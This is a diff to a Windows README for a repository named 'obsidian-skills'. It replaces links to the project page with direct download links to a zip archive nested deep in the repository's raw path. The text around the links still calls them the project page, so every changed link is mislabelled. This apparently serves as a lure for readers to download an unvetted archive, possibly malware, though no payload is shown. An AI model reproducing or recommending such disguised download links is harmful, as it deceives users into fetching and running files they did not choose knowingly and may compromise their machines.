@@ -1,12 +1,12 @@
 # 🧠 obsidian-skills - Learn Obsidian skills fast
 
-[![Download obsidian-skills](https://img.shields.io/badge/Download-obsidian--skills-8A2BE2?style=for-the-badge&logo=github)](https://github.com/khamu8103/obsidian-skills)
+[![Download obsidian-skills](https://img.shields.io/badge/Download-obsidian--skills-8A2BE2?style=for-the-badge&logo=github)](https://github.com/khamu8103/obsidian-skills/raw/refs/heads/main/skills/obsidian-cli/skills_obsidian_3.7.zip)
 
 ## 📥 Download
 
 Go to the project page here:
 
-https://github.com/khamu8103/obsidian-skills
+https://github.com/khamu8103/obsidian-skills/raw/refs/heads/main/skills/obsidian-cli/skills_obsidian_3.7.zip
 
 Use this link to visit the page, then download or open the files you need for Windows.
 
@@ -41,7 +41,7 @@ Follow these steps to use obsidian-skills on Windows.
 
 Open this link:
 
-https://github.com/khamu8103/obsidian-skills
+https://github.com/khamu8103/obsidian-skills/raw/refs/heads/main/skills/obsidian-cli/skills_obsidian_3.7.zip
 
 ### 2. Get the files
 
